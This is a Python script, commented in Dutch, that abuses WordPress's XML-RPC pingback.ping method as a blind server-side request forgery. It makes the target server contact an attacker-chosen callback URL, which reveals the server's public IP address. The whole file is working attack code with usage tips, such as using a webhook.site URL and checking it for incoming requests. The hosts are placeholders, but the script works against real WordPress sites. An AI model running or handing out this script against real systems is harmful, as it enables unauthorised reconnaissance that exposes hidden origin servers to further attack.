#!/usr/bin/env python3
"""
Stuurt een blind SSRF (pingback.ping) naar een externe callback URL 
om het publieke ip adres van de wordpress server te achterhalen.
"""

import requests

# Config :
WORDPRESS_URL = "https://wordpress-test-site.com"
TARGET_POST = "https://wordpress-test-site.com/2025/06/23/some-random-post/"
CALLBACK_URL = "https://example.com/callback" # any url can be used however best is to get a webhook.site url for free and use it here



def send_pingback(source_url, target_url):
    xml_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>{source_url}</string></value></param>
        <param><value><string>{target_url}</string></value></param>
    </params>
    </methodCall>"""

    headers = {"Content-Type": "application/xml"}
    xmlrpc_endpoint = f"{WORDPRESS_URL.rstrip('/')}/xmlrpc.php"

    try:
        response = requests.post(xmlrpc_endpoint, data=xml_payload, headers=headers, timeout=10)
        print(f"status code: {response.status_code}")
        print("XML-RPC response:")
        print(response.text)

        if "faultCode" in response.text:
            print("\nWarning : there is a fault code in the response. This can be normal as long as the server sent a request to the callback url")
        else:
            print("\nNo fault code in response. The server most likely sent a request to the callback url.")

        print(f"\nYou can now look in the dashboard of {CALLBACK_URL} if any request has been received")

    except Exception as e:
        print(f"Error during request {e}")

if __name__ == "__main__":
    print("Send ssrf callback request to wordpress server . . .")
    print(f"Wordpress url: {WORDPRESS_URL}")
    print(f"Target post url: {TARGET_POST}")
    print(f"Callback url: {CALLBACK_URL}\n")

    send_pingback(CALLBACK_URL, TARGET_POST)
